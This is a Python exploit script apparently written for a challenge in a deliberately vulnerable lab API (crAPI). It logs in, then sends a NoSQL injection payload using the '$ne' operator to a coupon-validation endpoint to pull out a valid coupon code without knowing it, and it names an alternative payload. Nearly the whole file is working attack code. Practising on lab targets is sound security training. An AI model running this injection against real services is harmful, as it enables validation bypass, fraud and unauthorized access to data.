#!/usr/bin/env python3
"""
Challenge 12: Get free coupons without knowing the code (NoSQL Injection)

Flow:
  1. Login
  2. Validate a coupon using NoSQL injection
  3. Get a valid coupon code
"""

import argparse
import sys
from pathlib import Path
from typing import Optional, Dict, Any

import requests
import yaml


def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)


def login(base_url: str, email: str, password: str, timeout: float = 15) -> Optional[str]:
    url = f"{base_url.rstrip('/')}/identity/api/auth/login"
    payload = {"email": email, "password": password}
    try:
        r = requests.post(url, json=payload, timeout=timeout)
        r.raise_for_status()
        data = r.json()
        return data.get("token") or data.get("access_token")
    except requests.RequestException as e:
        print(f"[!] Login failed: {e}")
        return None


def validate_coupon_injection(base_url: str, token: str, payload: Dict[str, Any], timeout: float = 15) -> Optional[Dict[str, Any]]:
    """Validate coupon with injection payload"""
    url = f"{base_url.rstrip('/')}/community/api/v2/coupon/validate-coupon"
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=timeout)
        r.raise_for_status()
        return r.json()
    except requests.RequestException as e:
        print(f"[!] validate_coupon failed: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(description="Challenge 12: NoSQL Injection - Free Coupons")
    parser.add_argument("--config", default="../crapi_config.yaml", help="Config file")
    parser.add_argument("--user-email", default="mike1@my.lab", help="User email")
    args = parser.parse_args()

    config_path = Path(args.config)
    if not config_path.exists():
        print(f"Config not found: {config_path}", file=sys.stderr)
        sys.exit(1)

    cfg = load_config(config_path)
    base_url = cfg["target"]["base_url"]
    password = cfg["known_users"]["password"]

    print(f"[*] Challenge 12: NoSQL Injection - Free Coupons")
    print(f"[*] Target: {base_url}")
    print("-" * 60)

    print(f"\n[1] Logging in...")
    token = login(base_url, args.user_email, password)
    if not token:
        print("[!] Login failed")
        sys.exit(1)
    print("[+] Logged in")

    print(f"\n[2] NoSQL Injection ATTACK: Validating coupon with $ne operator...")

    # NoSQL injection payload
    payload = {
        "coupon_code": {"$ne": None}
    }
    print(f"[!] Payload: {payload}")

    response = validate_coupon_injection(base_url, token, payload)

    if response:
        coupon_code = response.get("coupon_code")
        if coupon_code:
            print(f"\n[+] SUCCESS! Got valid coupon code: {coupon_code}")
            print(f"[+] Full response: {response}")
            print(f"\n[!] VULNERABLE: NoSQL Injection allows bypassing coupon validation")
        else:
            print(f"[!] No coupon in response: {response}")
    else:
        print("[!] Request failed")
        print("[*] Try alternative payload: {\"$ne\": 1}")


if __name__ == "__main__":
    main()
